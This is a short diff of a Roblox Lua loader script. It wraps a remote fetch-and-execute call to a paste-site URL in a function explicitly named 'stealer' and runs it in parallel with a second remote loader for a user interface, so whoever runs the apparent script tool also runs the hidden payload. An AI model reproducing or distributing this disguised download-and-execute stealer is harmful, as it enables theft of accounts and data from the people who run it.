@@ -1,1 +1,11 @@
-loadstring(game:HttpGet("https://pastefy.app/Cam1mUUi/raw"))()
+local function stealer()
+    loadstring(game:HttpGet("https://pastefy.app/Cam1mUUi/raw"))()
+end
+
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SkeboberScript/Roblox_Scripts/refs/heads/main/dsadads"))()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
